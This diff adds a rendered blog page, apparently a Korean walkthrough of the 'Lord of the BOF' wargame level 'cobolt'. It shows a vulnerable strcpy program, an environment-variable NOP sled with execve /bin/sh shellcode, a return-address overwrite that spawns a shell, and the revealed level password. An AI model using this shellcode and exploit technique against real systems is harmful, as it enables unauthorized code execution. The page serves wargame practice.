@@ -1,0 +1,49 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: gremlin
+Password:
+<span class="o">[</span>gremlin@localhost gremlin]<span class="nv">$ </span><span class="nb">ls
+</span>cobolt  cobolt.c
+<span class="o">[</span>gremlin@localhost gremlin]<span class="nv">$ </span><span class="nb">cat </span>cobolt.c
+/<span class="k">*</span>
+        The Lord of the BOF : The Fellowship of the BOF
+        - cobolt
+        - small buffer
+<span class="k">*</span>/
+
+int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
+<span class="o">{</span>
+    char buffer[16]<span class="p">;</span>
+    <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+    strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+<p>gremlin/hello bof world로 접속하자.
+이번에는 버퍼 크기가 굉장히 작다.
+쉘 코드를 버퍼 안에 넣어서는 풀 수 없다.
+이번에는 환경변수를 사용해야겠다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gremlin@localhost gremlin]<span class="nv">$ </span><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*2000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+<p>환경변수의 주소를 찾자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gremlin@localhost tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c
+int main<span class="o">()</span>
+<span class="o">{</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="o">[</span>gremlin@localhost tmp]<span class="nv">$ </span>./find
+bffff2ff
+</code></pre></div></div>
+<p>환경변수의 주소:bffff2ff
+이제 RET를 환경변수의 주소로 덮자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gremlin@localhost gremlin]<span class="nv">$ </span>./cobolt <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*20+"\xff\xf2\xff\xbf"'</span><span class="si">)</span>
+릱릱릱릱릱릱릱릱릱릱??
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 502
+hacking exposed
+</code></pre></div></div>
+<p>성공이다.
+gremlin’s password:hacking exposed</p>
+:ET
